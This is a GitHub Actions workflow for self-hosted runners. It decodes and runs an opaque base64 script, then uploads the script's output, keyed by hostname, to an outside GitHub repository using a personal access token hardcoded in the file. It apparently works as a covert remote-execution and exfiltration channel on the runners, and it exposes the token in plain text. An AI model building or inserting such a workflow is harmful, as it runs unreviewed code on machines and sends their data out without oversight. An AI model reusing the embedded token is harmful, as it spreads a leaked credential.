jobs:
  r:
    runs-on: [self-hosted, ul-l40s]
    timeout-minutes: 25
    steps:
      - name: run
        run: |
          echo "$B64" | base64 -d > /tmp/t2plant.sh
          bash /tmp/t2plant.sh 2>&1 | tee /tmp/t2plant.out
          H=$(hostname -s)
          C=$(base64 -w0 /tmp/t2plant.out)
          T=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
          P="cmdout8/ul-t2-plant_${H}.txt"
          B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
          S=$(curl -s -m 30 -H "Authorization: token $T" "$B?ref=main" | sed -n 's/.*"sha": "\([a-f0-9]*\)".*/\1/p' | head -1)
          if [ -n "$S" ]; then J="{\"message\":\"t2plant out\",\"content\":\"$C\",\"sha\":\"$S\",\"branch\":\"main\"}"; else J="{\"message\":\"t2plant out\",\"content\":\"$C\",\"branch\":\"main\"}"; fi
          curl -s -m 30 -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" -d "$J" "$B" > /tmp/put.json
          head -c 200 /tmp/put.json
